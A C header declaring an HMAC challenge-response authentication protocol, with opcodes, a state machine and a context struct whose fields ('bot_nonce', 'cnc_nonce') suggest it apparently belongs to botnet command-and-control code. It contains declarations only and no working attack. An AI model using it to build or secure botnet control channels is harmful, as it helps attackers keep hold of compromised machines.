#pragma once

#ifndef MUTUAL_AUTH_H
#define MUTUAL_AUTH_H

#include <stdint.h>
#include <stddef.h>

#define AUTH_NONCE_LEN      16
#define AUTH_HMAC_LEN       32
#define AUTH_SECRET_MAX_LEN 64

#define CMD_HELLO           0x20
#define CMD_CHALLENGE       0x21
#define CMD_AUTH_RESPONSE   0x22
#define CMD_AUTH_OK         0x23
#define CMD_AUTH_FAIL       0x24

typedef enum {
    AUTH_STATE_INIT,
    AUTH_STATE_HELLO_SENT,
    AUTH_STATE_CHALLENGE_RECEIVED,
    AUTH_STATE_RESPONSE_SENT,
    AUTH_STATE_AUTHENTICATED,
    AUTH_STATE_FAILED
} auth_state_t;

typedef struct {
    auth_state_t state;
    uint8_t bot_nonce[AUTH_NONCE_LEN];
    uint8_t cnc_nonce[AUTH_NONCE_LEN];
    uint8_t session_key[16];
} auth_context_t;

void auth_init(auth_context_t *ctx);
int auth_generate_nonce(uint8_t *nonce);
void auth_compute_hmac(const uint8_t *key, const uint8_t *data, size_t data_len, uint8_t *hmac);
int auth_verify_hmac(const uint8_t *key, const uint8_t *data, size_t data_len, const uint8_t *expected_hmac);
int auth_create_hello(auth_context_t *ctx, uint8_t *buffer);
int auth_process_challenge(auth_context_t *ctx, const uint8_t *data, size_t data_len);
int auth_create_response(auth_context_t *ctx,  const char *secret, size_t secret_len, uint8_t *buffer, size_t buffer_len);
int auth_process_auth_ok(auth_context_t *ctx, const uint8_t *data, size_t data_len);
void auth_cleanup(auth_context_t *ctx);

#endif /* MUTUAL_AUTH_H */
